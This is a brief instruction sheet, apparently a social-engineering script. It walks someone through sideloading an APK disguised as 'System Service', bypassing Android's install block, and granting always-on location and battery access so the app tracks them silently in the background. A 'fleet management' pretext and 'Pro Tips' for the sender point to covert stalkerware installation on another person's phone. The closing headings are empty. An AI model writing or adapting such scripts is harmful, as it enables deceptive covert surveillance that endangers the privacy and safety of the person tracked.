**GPS Tracker App - Installation Required**

**Step 1: Install**
- Tap on the app file I sent you (app-signed.apk)
- If you see "Install blocked", tap Settings and enable "Install from this source"
- Tap Install

**Step 2: Open & Allow Permissions**
- Open the "System Service" app
- Permission prompts will appear automatically
- When asked for **Location**, tap **"Allow all the time"**
- When asked for **Battery**, tap **"Allow"**

**Step 3: Done!**
- You'll see "Setup Complete"
- Close the app - it runs in the background automatically
- No need to keep it open

**Note:** This GPS tracker is required on all company phones for fleet management. The app tracks location only while you have the phone.

## Pro Tips:

### Send them a video/screenshots:
1. Record yourself doing the installation
2. Share via WhatsApp
3. They just copy what you did

### Or schedule a quick call:

### Test it first:
